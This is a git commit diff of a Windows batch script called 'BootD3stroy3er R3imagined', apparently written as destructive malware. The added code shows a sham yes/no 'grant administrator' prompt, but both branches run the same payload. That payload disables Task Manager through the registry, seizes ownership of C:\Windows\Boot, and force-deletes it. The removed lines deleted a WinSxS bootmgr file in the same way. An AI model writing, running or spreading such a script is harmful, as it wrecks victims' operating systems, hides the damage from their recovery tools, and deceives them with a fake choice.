b4b87f545117e0c9f1f17f8c81934c43f329deee
hunterhudspeth2030-arch <hunterhudspeth2030@gmail.com>
2025-11-24 18:51:41 -0700

    Update BootD3stroy3er R3imagined.bat

--- BootD3stroy3er R3imagined.bat
+++ BootD3stroy3er R3imagined.bat
@@ -1,9 +1,24 @@
 @echo off
-takeown /f "C:\Windows\WinSxS\x86_microsoft-windows-b..re-bootmanager-pcat_31bf3856ad364e35_10.0.26100.7171_none_02f45ca6aabb3590\bootmgr" 
-icacls "C:\Windows\WinSxS\x86_microsoft-windows-b..re-bootmanager-pcat_31bf3856ad364e35_10.0.26100.7171_none_02f45ca6aabb3590\bootmgr" /grant administrators:F /t
-cd "C:\Windows\WinSxS\x86_microsoft-windows-b..re-bootmanager-pcat_31bf3856ad364e35_10.0.26100.7171_none_02f45ca6aabb3590\bootmgr"
-@echo off 
-del /F /S /Q "C:\Windows\WinSxS\x86_microsoft-windows-b..re-bootmanager-pcat_31bf3856ad364e35_10.0.26100.7171_none_02f45ca6aabb3590\bootmgr"
+echo Please grant administrator to continue (answer in only yes/no)
+set /p input=
+if /i %input%==yes goto A
+if /i %input%==no goto B
 
+:A
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
+takeown /f "C:\Windows\Boot"
+icacls "C:\Windows\Boot" /grant administrators:F /t
+@echo off 
+del /F /S /Q "C:\Windows\Boot"
+pause
+
+
+:B 
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
+takeown /f "C:\Windows\Boot"
+icacls "C:\Windows\Boot" /grant administrators:F /t
+@echo off 
+del /F /S /Q "C:\Windows\Boot"
+pause
 
 
